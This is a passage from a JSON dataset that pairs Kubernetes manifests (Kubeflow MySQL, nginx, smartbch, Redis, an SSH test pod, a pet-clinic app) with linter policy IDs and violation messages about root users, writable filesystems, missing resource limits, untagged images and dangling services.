\"LIVENESS_THRESHOLD_SECONDS=${LIVENESS_THRESHOLD_SECONDS:-300}; STUCK_THRESHOLD_SECONDS=${LIVENESS_THRESHOLD_SECONDS:-900};\\\n          \\ if [ ! -e /var/log/fluentd-buffers ]; then\\n  exit 1;\\nfi; LAST_MODIFIED_DATE=`stat\\\n          \\ /var/log/fluentd-buffers | grep Modify | sed -r \\\"s/Modify: (.*)/\\\\1/\\\"\\\n          `; LAST_MODIFIED_TIMESTAMP=`date -d \\\"$LAST_MODIFIED_DATE\\\" +%s`; if [ `date\\\n          \\ +%s` -gt `expr $LAST_MODIFIED_TIMESTAMP + $STUCK_THRESHOLD_SECONDS` ];\\\n          \\ then\\n  rm -rf /var/log/fluentd-buffers;\\n  exit 1;\\nfi; if [ `date +%s`\\\n          \\ -gt `expr $LAST_MODIFIED_TIMESTAMP + $LIVENESS_THRESHOLD_SECONDS` ]; then\\n\\\n          \\  exit 1;\\nfi;\\n\"\n  volumes:\n  - name: varlog\n    hostPath:\n      path: /var/log\n  - name: varlibdockercontainers\n    hostPath:\n      path: /var/lib/docker/containers\n  - name: libsystemddir\n    hostPath:\n      path: /usr/lib64\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"fluentd-cloud-logging\" is not set to runAsNonRoot"
  },
  {
    "id": "6772",
    "manifest_path": "data/manifests/the_stack_sample/sample_2457.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: metadata\n    app.kubernetes.io/instance: metadata-0.2.1\n    app.kubernetes.io/managed-by: kfctl\n    app.kubernetes.io/name: metadata\n    app.kubernetes.io/part-of: kubeflow\n    app.kubernetes.io/version: 0.2.1\n    component: db\n    kustomize.component: metadata\n  name: metadata-db\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: metadata\n      app.kubernetes.io/instance: metadata-0.2.1\n      app.kubernetes.io/managed-by: kfctl\n      app.kubernetes.io/name: metadata\n      app.kubernetes.io/part-of: kubeflow\n      app.kubernetes.io/version: 0.2.1\n      component: db\n      kustomize.component: metadata\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app.kubernetes.io/component: metadata\n        app.kubernetes.io/instance: metadata-0.2.1\n        app.kubernetes.io/managed-by: kfctl\n        app.kubernetes.io/name: metadata\n        app.kubernetes.io/part-of: kubeflow\n        app.kubernetes.io/version: 0.2.1\n        component: db\n        kustomize.component: metadata\n      name: db\n    spec:\n      containers:\n      - args:\n        - --datadir\n        - /var/lib/mysql/datadir\n        envFrom:\n        - configMapRef:\n            name: metadata-db-parameters\n        - secretRef:\n            name: metadata-db-secrets\n        image: uhub.service.ucloud.cn/a4x-kubeflow/mysql:8.0.3\n        name: db-container\n        ports:\n        - containerPort: 3306\n          name: dbapi\n        readinessProbe:\n          exec:\n            command:\n            - /bin/bash\n            - -c\n            - mysql -D $$MYSQL_DATABASE -p$$MYSQL_ROOT_PASSWORD -e 'SELECT 1'\n          initialDelaySeconds: 5\n          periodSeconds: 2\n          timeoutSeconds: 1\n        volumeMounts:\n        - mountPath: /var/lib/mysql\n          name: metadata-mysql\n      volumes:\n      - name: metadata-mysql\n        persistentVolumeClaim:\n          claimName: metadata-mysql\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"db-container\" does not have a read-only root file system"
  },
  {
    "id": "6773",
    "manifest_path": "data/manifests/the_stack_sample/sample_2457.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: metadata\n    app.kubernetes.io/instance: metadata-0.2.1\n    app.kubernetes.io/managed-by: kfctl\n    app.kubernetes.io/name: metadata\n    app.kubernetes.io/part-of: kubeflow\n    app.kubernetes.io/version: 0.2.1\n    component: db\n    kustomize.component: metadata\n  name: metadata-db\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: metadata\n      app.kubernetes.io/instance: metadata-0.2.1\n      app.kubernetes.io/managed-by: kfctl\n      app.kubernetes.io/name: metadata\n      app.kubernetes.io/part-of: kubeflow\n      app.kubernetes.io/version: 0.2.1\n      component: db\n      kustomize.component: metadata\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app.kubernetes.io/component: metadata\n        app.kubernetes.io/instance: metadata-0.2.1\n        app.kubernetes.io/managed-by: kfctl\n        app.kubernetes.io/name: metadata\n        app.kubernetes.io/part-of: kubeflow\n        app.kubernetes.io/version: 0.2.1\n        component: db\n        kustomize.component: metadata\n      name: db\n    spec:\n      containers:\n      - args:\n        - --datadir\n        - /var/lib/mysql/datadir\n        envFrom:\n        - configMapRef:\n            name: metadata-db-parameters\n        - secretRef:\n            name: metadata-db-secrets\n        image: uhub.service.ucloud.cn/a4x-kubeflow/mysql:8.0.3\n        name: db-container\n        ports:\n        - containerPort: 3306\n          name: dbapi\n        readinessProbe:\n          exec:\n            command:\n            - /bin/bash\n            - -c\n            - mysql -D $$MYSQL_DATABASE -p$$MYSQL_ROOT_PASSWORD -e 'SELECT 1'\n          initialDelaySeconds: 5\n          periodSeconds: 2\n          timeoutSeconds: 1\n        volumeMounts:\n        - mountPath: /var/lib/mysql\n          name: metadata-mysql\n      volumes:\n      - name: metadata-mysql\n        persistentVolumeClaim:\n          claimName: metadata-mysql\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"db-container\" is not set to runAsNonRoot"
  },
  {
    "id": "6774",
    "manifest_path": "data/manifests/the_stack_sample/sample_2457.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: metadata\n    app.kubernetes.io/instance: metadata-0.2.1\n    app.kubernetes.io/managed-by: kfctl\n    app.kubernetes.io/name: metadata\n    app.kubernetes.io/part-of: kubeflow\n    app.kubernetes.io/version: 0.2.1\n    component: db\n    kustomize.component: metadata\n  name: metadata-db\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: metadata\n      app.kubernetes.io/instance: metadata-0.2.1\n      app.kubernetes.io/managed-by: kfctl\n      app.kubernetes.io/name: metadata\n      app.kubernetes.io/part-of: kubeflow\n      app.kubernetes.io/version: 0.2.1\n      component: db\n      kustomize.component: metadata\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app.kubernetes.io/component: metadata\n        app.kubernetes.io/instance: metadata-0.2.1\n        app.kubernetes.io/managed-by: kfctl\n        app.kubernetes.io/name: metadata\n        app.kubernetes.io/part-of: kubeflow\n        app.kubernetes.io/version: 0.2.1\n        component: db\n        kustomize.component: metadata\n      name: db\n    spec:\n      containers:\n      - args:\n        - --datadir\n        - /var/lib/mysql/datadir\n        envFrom:\n        - configMapRef:\n            name: metadata-db-parameters\n        - secretRef:\n            name: metadata-db-secrets\n        image: uhub.service.ucloud.cn/a4x-kubeflow/mysql:8.0.3\n        name: db-container\n        ports:\n        - containerPort: 3306\n          name: dbapi\n        readinessProbe:\n          exec:\n            command:\n            - /bin/bash\n            - -c\n            - mysql -D $$MYSQL_DATABASE -p$$MYSQL_ROOT_PASSWORD -e 'SELECT 1'\n          initialDelaySeconds: 5\n          periodSeconds: 2\n          timeoutSeconds: 1\n        volumeMounts:\n        - mountPath: /var/lib/mysql\n          name: metadata-mysql\n      volumes:\n      - name: metadata-mysql\n        persistentVolumeClaim:\n          claimName: metadata-mysql\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"db-container\" has cpu request 0"
  },
  {
    "id": "6775",
    "manifest_path": "data/manifests/the_stack_sample/sample_2457.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: metadata\n    app.kubernetes.io/instance: metadata-0.2.1\n    app.kubernetes.io/managed-by: kfctl\n    app.kubernetes.io/name: metadata\n    app.kubernetes.io/part-of: kubeflow\n    app.kubernetes.io/version: 0.2.1\n    component: db\n    kustomize.component: metadata\n  name: metadata-db\n  namespace: kubeflow\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: metadata\n      app.kubernetes.io/instance: metadata-0.2.1\n      app.kubernetes.io/managed-by: kfctl\n      app.kubernetes.io/name: metadata\n      app.kubernetes.io/part-of: kubeflow\n      app.kubernetes.io/version: 0.2.1\n      component: db\n      kustomize.component: metadata\n  template:\n    metadata:\n      annotations:\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app.kubernetes.io/component: metadata\n        app.kubernetes.io/instance: metadata-0.2.1\n        app.kubernetes.io/managed-by: kfctl\n        app.kubernetes.io/name: metadata\n        app.kubernetes.io/part-of: kubeflow\n        app.kubernetes.io/version: 0.2.1\n        component: db\n        kustomize.component: metadata\n      name: db\n    spec:\n      containers:\n      - args:\n        - --datadir\n        - /var/lib/mysql/datadir\n        envFrom:\n        - configMapRef:\n            name: metadata-db-parameters\n        - secretRef:\n            name: metadata-db-secrets\n        image: uhub.service.ucloud.cn/a4x-kubeflow/mysql:8.0.3\n        name: db-container\n        ports:\n        - containerPort: 3306\n          name: dbapi\n        readinessProbe:\n          exec:\n            command:\n            - /bin/bash\n            - -c\n            - mysql -D $$MYSQL_DATABASE -p$$MYSQL_ROOT_PASSWORD -e 'SELECT 1'\n          initialDelaySeconds: 5\n          periodSeconds: 2\n          timeoutSeconds: 1\n        volumeMounts:\n        - mountPath: /var/lib/mysql\n          name: metadata-mysql\n      volumes:\n      - name: metadata-mysql\n        persistentVolumeClaim:\n          claimName: metadata-mysql\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"db-container\" has memory limit 0"
  },
  {
    "id": "6776",
    "manifest_path": "data/manifests/the_stack_sample/sample_2462.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1536\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6777",
    "manifest_path": "data/manifests/the_stack_sample/sample_2462.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1536\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "6778",
    "manifest_path": "data/manifests/the_stack_sample/sample_2462.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1536\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "6779",
    "manifest_path": "data/manifests/the_stack_sample/sample_2462.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1536\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "6780",
    "manifest_path": "data/manifests/the_stack_sample/sample_2462.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-1536\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "6781",
    "manifest_path": "data/manifests/the_stack_sample/sample_2465.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  labels:\n    service: smartbch\n    version: 0.3.5\n    deploy: smartbch-1\n  name: smartbch\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      service: smartbch\n      deploy: smartbch-1\n  template:\n    metadata:\n      labels:\n        service: smartbch\n        deploy: smartbch-1\n    spec:\n      containers:\n      - args:\n        - start\n        - --mainnet-genesis-height=698502\n        - --https.addr=off\n        - --wss.addr=off\n        command:\n        - ./smartbchd\n        image: zquestz/smartbch:0.3.5\n        imagePullPolicy: Always\n        name: smartbch\n        volumeMounts:\n        - mountPath: /root/.smartbchd\n          name: smartbch-data\n        resources:\n          requests:\n            memory: 9Gi\n          limits:\n            memory: 9Gi\n        ports:\n        - name: api\n          containerPort: 8545\n        - name: websocket\n          containerPort: 8546\n        - name: peer\n          containerPort: 26656\n      volumes:\n      - name: smartbch-data\n        gcePersistentDisk:\n          pdName: smartbch-data\n          fsType: ext4\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"smartbch\" does not have a read-only root file system"
  },
  {
    "id": "6782",
    "manifest_path": "data/manifests/the_stack_sample/sample_2465.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  labels:\n    service: smartbch\n    version: 0.3.5\n    deploy: smartbch-1\n  name: smartbch\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      service: smartbch\n      deploy: smartbch-1\n  template:\n    metadata:\n      labels:\n        service: smartbch\n        deploy: smartbch-1\n    spec:\n      containers:\n      - args:\n        - start\n        - --mainnet-genesis-height=698502\n        - --https.addr=off\n        - --wss.addr=off\n        command:\n        - ./smartbchd\n        image: zquestz/smartbch:0.3.5\n        imagePullPolicy: Always\n        name: smartbch\n        volumeMounts:\n        - mountPath: /root/.smartbchd\n          name: smartbch-data\n        resources:\n          requests:\n            memory: 9Gi\n          limits:\n            memory: 9Gi\n        ports:\n        - name: api\n          containerPort: 8545\n        - name: websocket\n          containerPort: 8546\n        - name: peer\n          containerPort: 26656\n      volumes:\n      - name: smartbch-data\n        gcePersistentDisk:\n          pdName: smartbch-data\n          fsType: ext4\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"smartbch\" is not set to runAsNonRoot"
  },
  {
    "id": "6783",
    "manifest_path": "data/manifests/the_stack_sample/sample_2465.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  labels:\n    service: smartbch\n    version: 0.3.5\n    deploy: smartbch-1\n  name: smartbch\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      service: smartbch\n      deploy: smartbch-1\n  template:\n    metadata:\n      labels:\n        service: smartbch\n        deploy: smartbch-1\n    spec:\n      containers:\n      - args:\n        - start\n        - --mainnet-genesis-height=698502\n        - --https.addr=off\n        - --wss.addr=off\n        command:\n        - ./smartbchd\n        image: zquestz/smartbch:0.3.5\n        imagePullPolicy: Always\n        name: smartbch\n        volumeMounts:\n        - mountPath: /root/.smartbchd\n          name: smartbch-data\n        resources:\n          requests:\n            memory: 9Gi\n          limits:\n            memory: 9Gi\n        ports:\n        - name: api\n          containerPort: 8545\n        - name: websocket\n          containerPort: 8546\n        - name: peer\n          containerPort: 26656\n      volumes:\n      - name: smartbch-data\n        gcePersistentDisk:\n          pdName: smartbch-data\n          fsType: ext4\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"smartbch\" has cpu request 0"
  },
  {
    "id": "6784",
    "manifest_path": "data/manifests/the_stack_sample/sample_2467.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: enterprise-metrics-querier\n    app.kubernetes.io/managed-by: Helmraiser\n    chart: enterprise-metrics-1.4.5\n    heritage: Helm\n    release: enterprise-metrics\n  name: enterprise-metrics-querier\n  namespace: enterprise-metrics\nspec:\n  ports:\n  - name: http-metrics\n    port: 8080\n    protocol: TCP\n    targetPort: http-metrics\n  - name: grpc\n    port: 9095\n    protocol: TCP\n    targetPort: grpc\n  selector:\n    app: enterprise-metrics-querier\n    release: enterprise-metrics\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:enterprise-metrics-querier release:enterprise-metrics])"
  },
  {
    "id": "6785",
    "manifest_path": "data/manifests/the_stack_sample/sample_2468.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: redis-cluster\n  labels:\n    app: redis-cluster\nspec:\n  ports:\n  - port: 6379\n    targetPort: 6379\n    name: client\n  - port: 16379\n    targetPort: 16379\n    name: gossip\n  clusterIP: None\n  selector:\n    app: redis-cluster-3\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:redis-cluster-3])"
  },
  {
    "id": "6786",
    "manifest_path": "data/manifests/the_stack_sample/sample_2469.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ssh-pod-c-node-1\n  labels:\n    env: test\nspec:\n  containers:\n  - name: ssh-pod-c-node-1\n    image: ahdepe/simple-ssh-pod\n    imagePullPolicy: IfNotPresent\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"ssh-pod-c-node-1\" is using an invalid container image, \"ahdepe/simple-ssh-pod\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6787",
    "manifest_path": "data/manifests/the_stack_sample/sample_2469.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ssh-pod-c-node-1\n  labels:\n    env: test\nspec:\n  containers:\n  - name: ssh-pod-c-node-1\n    image: ahdepe/simple-ssh-pod\n    imagePullPolicy: IfNotPresent\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ssh-pod-c-node-1\" does not have a read-only root file system"
  },
  {
    "id": "6788",
    "manifest_path": "data/manifests/the_stack_sample/sample_2469.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ssh-pod-c-node-1\n  labels:\n    env: test\nspec:\n  containers:\n  - name: ssh-pod-c-node-1\n    image: ahdepe/simple-ssh-pod\n    imagePullPolicy: IfNotPresent\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ssh-pod-c-node-1\" is not set to runAsNonRoot"
  },
  {
    "id": "6789",
    "manifest_path": "data/manifests/the_stack_sample/sample_2469.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ssh-pod-c-node-1\n  labels:\n    env: test\nspec:\n  containers:\n  - name: ssh-pod-c-node-1\n    image: ahdepe/simple-ssh-pod\n    imagePullPolicy: IfNotPresent\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ssh-pod-c-node-1\" has cpu request 0"
  },
  {
    "id": "6790",
    "manifest_path": "data/manifests/the_stack_sample/sample_2469.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: ssh-pod-c-node-1\n  labels:\n    env: test\nspec:\n  containers:\n  - name: ssh-pod-c-node-1\n    image: ahdepe/simple-ssh-pod\n    imagePullPolicy: IfNotPresent\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ssh-pod-c-node-1\" has memory limit 0"
  },
  {
    "id": "6791",
    "manifest_path": "data/manifests/the_stack_sample/sample_2470.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: iopl-test\nspec:\n  template:\n    spec:\n      containers:\n      - name: iopl-test\n        image: quay.io/robbmanes/iopl-test:latest\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - SYS_RAWIO\n",
    "policy_id": "drop-net-raw-capability",
    "violation_text": "container \"iopl-test\" has DROP capabilities: [], but does not drop capability \"NET_RAW\" which is required"
  },
  {
    "id": "6792",
    "manifest_path": "data/manifests/the_stack_sample/sample_2470.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: iopl-test\nspec:\n  template:\n    spec:\n      containers:\n      - name: iopl-test\n        image: quay.io/robbmanes/iopl-test:latest\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - SYS_RAWIO\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "6793",
    "manifest_path": "data/manifests/the_stack_sample/sample_2470.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: iopl-test\nspec:\n  template:\n    spec:\n      containers:\n      - name: iopl-test\n        image: quay.io/robbmanes/iopl-test:latest\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - SYS_RAWIO\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"iopl-test\" is using an invalid container image, \"quay.io/robbmanes/iopl-test:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6794",
    "manifest_path": "data/manifests/the_stack_sample/sample_2470.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: iopl-test\nspec:\n  template:\n    spec:\n      containers:\n      - name: iopl-test\n        image: quay.io/robbmanes/iopl-test:latest\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - SYS_RAWIO\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"iopl-test\" does not have a read-only root file system"
  },
  {
    "id": "6795",
    "manifest_path": "data/manifests/the_stack_sample/sample_2470.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: iopl-test\nspec:\n  template:\n    spec:\n      containers:\n      - name: iopl-test\n        image: quay.io/robbmanes/iopl-test:latest\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - SYS_RAWIO\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"iopl-test\" is not set to runAsNonRoot"
  },
  {
    "id": "6796",
    "manifest_path": "data/manifests/the_stack_sample/sample_2470.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: iopl-test\nspec:\n  template:\n    spec:\n      containers:\n      - name: iopl-test\n        image: quay.io/robbmanes/iopl-test:latest\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - SYS_RAWIO\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"iopl-test\" has cpu request 0"
  },
  {
    "id": "6797",
    "manifest_path": "data/manifests/the_stack_sample/sample_2470.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: iopl-test\nspec:\n  template:\n    spec:\n      containers:\n      - name: iopl-test\n        image: quay.io/robbmanes/iopl-test:latest\n        imagePullPolicy: Always\n        securityContext:\n          capabilities:\n            add:\n            - SYS_RAWIO\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"iopl-test\" has memory limit 0"
  },
  {
    "id": "6798",
    "manifest_path": "data/manifests/the_stack_sample/sample_2471.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pet-web-canary\n  labels:\n    app: pet\nspec:\n  selector:\n    matchLabels:\n      app: pet\n      tier: frontend\n  template:\n    metadata:\n      labels:\n        app: pet\n        tier: frontend\n        track: canary\n    spec:\n      containers:\n      - image: us.gcr.io/devops-workshop-mb/pet-app\n        imagePullPolicy: IfNotPresent\n        name: pet-web\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: mysql\n        - name: PET_DB_DATABASE\n          value: petclinic\n        - name: PET_DB_USER\n          value: petclinic-user\n        - name: PET_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-pass\n              key: password\n        ports:\n        - containerPort: 8080\n          name: pet-web\n        livenessProbe:\n          httpGet:\n            path: /manage/health\n            port: pet-web\n          initialDelaySeconds: 30\n        readinessProbe:\n          httpGet:\n            path: /manage/health\n            port: pet-web\n          initialDelaySeconds: 30\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"pet-web\" is using an invalid container image, \"us.gcr.io/devops-workshop-mb/pet-app\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6799",
    "manifest_path": "data/manifests/the_stack_sample/sample_2471.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pet-web-canary\n  labels:\n    app: pet\nspec:\n  selector:\n    matchLabels:\n      app: pet\n      tier: frontend\n  template:\n    metadata:\n      labels:\n        app: pet\n        tier: frontend\n        track: canary\n    spec:\n      containers:\n      - image: us.gcr.io/devops-workshop-mb/pet-app\n        imagePullPolicy: IfNotPresent\n        name: pet-web\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: mysql\n        - name: PET_DB_DATABASE\n          value: petclinic\n        - name: PET_DB_USER\n          value: petclinic-user\n        - name: PET_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-pass\n              key: password\n        ports:\n        - containerPort: 8080\n          name: pet-web\n        livenessProbe:\n          httpGet:\n            path: /manage/health\n            port: pet-web\n          initialDelaySeconds: 30\n        readinessProbe:\n          httpGet:\n            path: /manage/health\n            port: pet-web\n          initialDelaySeconds: 30\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"pet-web\" does not have a read-only root file system"
  },
  {
    "id": "6800",
    "manifest_path": "data/manifests/the_stack_sample/sample_2471.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pet-web-canary\n  labels:\n    app: pet\nspec:\n  selector:\n    matchLabels:\n      app: pet\n      tier: frontend\n  template:\n    metadata:\n      labels:\n        app: pet\n        tier: frontend\n        track: canary\n    spec:\n      containers:\n      - image: us.gcr.io/devops-workshop-mb/pet-app\n        imagePullPolicy: IfNotPresent\n        name: pet-web\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: mysql\n        - name: PET_DB_DATABASE\n          value: petclinic\n        - name: PET_DB_USER\n          value: petclinic-user\n        - name: PET_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-pass\n              key: password\n        ports:\n        - containerPort: 8080\n          name: pet-web\n        livenessProbe:\n          httpGet:\n            path: /manage/health\n            port: pet-web\n          initialDelaySeconds: 30\n        readinessProbe:\n          httpGet:\n            path: /manage/health\n            port: pet-web\n          initialDelaySeconds: 30\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"pet-web\" is not set to runAsNonRoot"
  },
  {
    "id": "6801",
    "manifest_path": "data/manifests/the_stack_sample/sample_2471.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pet-web-canary\n  labels:\n    app: pet\nspec:\n  selector:\n    matchLabels:\n      app: pet\n      tier: frontend\n  template:\n    metadata:\n      labels:\n        app: pet\n        tier: frontend\n        track: canary\n    spec:\n      containers:\n      - image: us.gcr.io/devops-workshop-mb/pet-app\n        imagePullPolicy: IfNotPresent\n        name: pet-web\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: mysql\n        - name: PET_DB_DATABASE\n          value: petclinic\n        - name: PET_DB_USER\n          value: petclinic-user\n        - name: PET_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-pass\n              key: password\n        ports:\n        - containerPort: 8080\n          name: pet-web\n        livenessProbe:\n          httpGet:\n            path: /manage/health\n            port: pet-web\n          initialDelaySeconds: 30\n        readinessProbe:\n          httpGet:\n            path: /manage/health\n            port: pet-web\n          initialDelaySeconds: 30\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"pet-web\" has cpu request 0"
  },
  {
    "id": "6802",
    "manifest_path": "data/manifests/the_stack_sample/sample_2471.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pet-web-canary\n  labels:\n    app: pet\nspec:\n  selector:\n    matchLabels:\n      app: pet\n      tier: frontend\n  template:\n    metadata:\n      labels:\n        app: pet\n        tier: frontend\n        track: canary\n    spec:\n      containers:\n      - image: us.gcr.io/devops-workshop-mb/pet-app\n        imagePullPolicy: IfNotPresent\n        name: pet-web\n        env:\n        - name: SPRING_PROFILES_ACTIVE\n          value: mysql\n        - name: PET_DB_DATABASE\n          value: petclinic\n        - name: PET_DB_USER\n          value: petclinic-user\n        - name: PET_DB_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-pass\n              key: password\n        ports:\n        - containerPort: 8080\n          name: pet-web\n        livenessProbe:\n          httpGet:\n            path: /manage/health\n            port: pet-web\n          initialDelaySeconds: 30\n        readinessProbe:\n          httpGet:\n            path: /manage/health\n            port: pet-web\n          initialDelaySeconds: 30\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"pet-web\" has memory limit 0"
  },
  {
    "id": "6803",
    "manifest_path": "data/manifests/the_stack_sample/sample_2472.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: capstone-app\n  labels:\n    app: capstone\nspec:\n  ports:\n  - port: 8080\n    targetPort: 80\n  selector:\n    app: capstone\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:capstone])"
  },
  {
    "id": "6804",
    "manifest_path": "data/manifests/the_stack_sample/sample_2476.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: bsbmp-exporter\n    bsbmp_group: basement\n  name: bsbmp-exporter\n  namespace: monitoring\nspec:\n  ports:\n  - name: http\n    port: 9756\n    targetPort: http\n",
    "policy_id": "dangling-service",
    "violation_text": "service has no selector specified"
  },
  {
    "id": "6805",
    "manifest_path": "data/manifests/the_stack_sample/sample_2478.yaml",
